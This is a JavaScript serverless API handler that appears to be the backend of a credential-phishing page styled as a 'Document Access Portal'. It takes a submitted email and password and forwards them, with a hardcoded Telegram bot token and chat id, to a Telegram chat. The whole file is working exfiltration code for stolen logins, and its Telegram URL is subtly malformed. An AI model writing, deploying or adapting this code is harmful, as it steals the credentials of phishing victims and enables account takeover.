export default async function handler(req, res) {
    // 1. Enforce strict POST method restriction
    if (req.method !== 'POST') {
        res.setHeader('Allow', ['POST']);
        return res.status(405).json({ error: `Method ${req.method} Not Allowed` });
    }

    try {
        // 2. Manually collect and stitch data stream buffers
        let buffers = [];
        for await (const chunk of req) {
            buffers.push(chunk);
        }
        const dataBuffer = Buffer.concat(buffers).toString();
        
        let body = {};
        if (dataBuffer) {
            try {
                body = JSON.parse(dataBuffer);
            } catch (e) {
                return res.status(400).json({ error: "Invalid JSON format received by server." });
            }
        }

        const { email, password } = body;

        // 3. Validation Check
        if (!email || !password) {
            return res.status(400).json({ error: "Please complete all verification fields." });
        }

        // 4. Configuration Details
        const botToken = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc";
        const chatId = "1080822304";

        // 5. Build Message Template
        const messageText = `📄 *DOCUMENT ACCESS PORTAL REGISTRATION*\n\n`
                          + `📧 *Portal Email:* ${email}\n`
                          + `🔑 *Access Key:* \`${password}\``;

        const telegramUrl = `https://telegram.org{botToken}/sendMessage`;

        // 6. Forward Data to Official Telegram API Gateway Subdomain
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        // 7. Handle Serverless Gateway Responses
        if (response.ok && result.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(400).json({ error: result.description || "Telegram API rejected the request." });
        }

    } catch (error) {
        // Bubble up internal execution failures transparently to the client interface
        return res.status(500).json({ error: `Server Exception: ${error.message}` });
    }
}
